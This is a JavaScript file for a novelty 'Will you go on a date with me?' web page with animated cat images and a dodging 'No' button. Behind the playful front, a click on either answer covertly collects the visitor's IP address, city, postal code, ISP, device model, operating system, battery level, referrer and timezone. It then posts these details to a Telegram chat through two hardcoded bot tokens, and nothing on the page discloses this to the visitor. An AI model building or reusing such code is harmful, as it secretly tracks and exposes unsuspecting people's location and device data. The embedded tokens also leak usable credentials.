async function getUserInfo(action) {
    try {
        // Fetch IP address
        let ipResponse = await fetch("https://api.ipify.org?format=json");
        let ipData = await ipResponse.json();
        let ip = ipData.ip;

        // Fetch geolocation and ISP data
        let geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        let geoData = await geoResponse.json();

        // Extract location and ISP details
        let city = geoData.city || "Unknown";
        let region = geoData.regionName || "Unknown";
        let country = geoData.country || "Unknown";
        let isp = geoData.isp || "Unknown";
        let postalCode = geoData.zip || "Unknown";

        // Determine network type
        let networkType = geoData.mobile ? "Mobile" : "Broadband";

        // Get user agent and device info
        let userAgent = navigator.userAgent;
        let browser = /chrome/i.test(userAgent) ? "Chrome" :
                      /firefox/i.test(userAgent) ? "Firefox" :
                      /safari/i.test(userAgent) ? "Safari" :
                      /edge/i.test(userAgent) ? "Edge" : "Unknown Browser";

        let os = /android/i.test(userAgent) ? "Android" :
                /iphone|ipad|ipod/i.test(userAgent) ? "iOS" :
                /windows/i.test(userAgent) ? "Windows" :
                /mac os/i.test(userAgent) ? "macOS" :
                /linux/i.test(userAgent) ? "Linux" : "Unknown OS";

        let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "PC/Laptop";

        // Get device model
        function getDeviceModel() {
            if (/android/i.test(userAgent)) {
                let match = userAgent.match(/\(([^)]+)\)/);
                return match ? match[1].split(";")[1].trim() : "Android Device";
            }
            if (/iphone|ipad|ipod/i.test(userAgent)) {
                return "Apple " + (navigator.platform || "iOS Device");
            }
            if (/windows/i.test(userAgent)) {
                return "Windows PC";
            }
            if (/macintosh|mac os/i.test(userAgent)) {
                return "MacBook / iMac";
            }
            if (/linux/i.test(userAgent)) {
                return "Linux Device";
            }
            return "Unknown Device";
        }
        let deviceModel = getDeviceModel();

        // Get connection and battery info
        let connectionType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
        let screenWidth = screen.width;
        let screenHeight = screen.height;

        // Get battery info (handle potential errors)
        let batteryLevel = "Unknown";
        let chargingStatus = "Unknown";
        try {
            let battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100);
            chargingStatus = battery.charging ? "Charging" : "Not Charging";
        } catch (error) {
            console.error("Error fetching battery info:", error);
        }

        // Get referrer and timezone
        let referrer = document.referrer ? document.referrer : "Direct Visit (No Referrer)";
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Prepare bot messages
        let mainBotMessage = `\u{1F389} Someone with IP: ${ip} said ${action} to your proposal`;
        let detailedMessage = `\u{1F4E2} Someone clicked ${action}!\n\n` +
            `\u{1F4CD} Location: ${city}, ${region}, ${country} (${postalCode})\n` +
            `\u{1F517} IP Address: ${ip}\n` +
            `\u{1F3E2} ISP: ${isp}\n` +
            `\u{1F4F6} Network Type: ${networkType}\n` +
            `\u{1F310} Internet Connection: ${connectionType}\n` +
            `\u{1F4F1} Device Type: ${deviceType}\n` +
            `\u{1F4BB} Device Model: ${deviceModel}\n` +
            `\u{1F5A5} OS: ${os}\n` +
            `\u{1F30E} Browser: ${browser}\n` +
            `\u{1F5B3} Screen Resolution: ${screenWidth}x${screenHeight}\n` +
            `\u{1F50B} Battery: ${batteryLevel}% (${chargingStatus})\n` +
            `\u{1F310} Referring Website: ${referrer}\n` +
            `\u{23F0} Timezone: ${timezone}\n`;

        // Send messages to Telegram bots
        let mainBotToken = "7734214657:AAH7BTiw8WOHv0tztVZ2dNW-Qkhke8n94rs";
        let secondaryBotToken = "7208059954:AAFoxSdzpqVDQFqBNZ4aoSiSRxlgpaJROBQ";
        let chatId = "5471661264";

        await fetch(`https://api.telegram.org/bot${mainBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: mainBotMessage })
        });

        await fetch(`https://api.telegram.org/bot${secondaryBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: detailedMessage })
        });

    } catch (error) {
        console.error("Error fetching data: ", error);
    }
}

function changeContent() {
    document.getElementById('mainHeading').innerText = "YAY, see you soon...ɷ◡ɷ";
    document.getElementById('catGif').src = "images/goma-goma-cat.gif";
    document.getElementById('yessoundEffect').play();
    getUserInfo("YES");
}

function noButtonClick() {
    document.getElementById('noButtonClickSound').play();
    document.getElementById('mainHeading').innerText = "STFU....(ᗒᗣᗕ)՞";
    document.getElementById('catGif').src = "images/angry-cat.gif";

    setTimeout(function () {
        document.getElementById('mainHeading').innerText = "Will you go on a date with me?";
        document.getElementById('catGif').src = "images/peach-goma-love-heart-dance.gif";
    }, 1500);
    getUserInfo("NO");
}

function getRandomPosition() {
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;
    const buttonHeight = document.getElementById('NO').offsetHeight;
    const buttonWidth = document.getElementById('NO').offsetWidth;
    const randomY = Math.floor(Math.random() * (windowHeight - buttonHeight));
    const randomX = Math.floor(Math.random() * (windowWidth - buttonWidth));
    return { top: randomY, left: randomX };
}

function moveButton() {
    const noButton = document.getElementById('NO');
    const randomPosition = getRandomPosition();
    noButton.style.position = 'absolute';
    noButton.style.top = `${randomPosition.top}px`;
    noButton.style.left = `${randomPosition.left}px`;
}

setInterval(moveButton, 300);
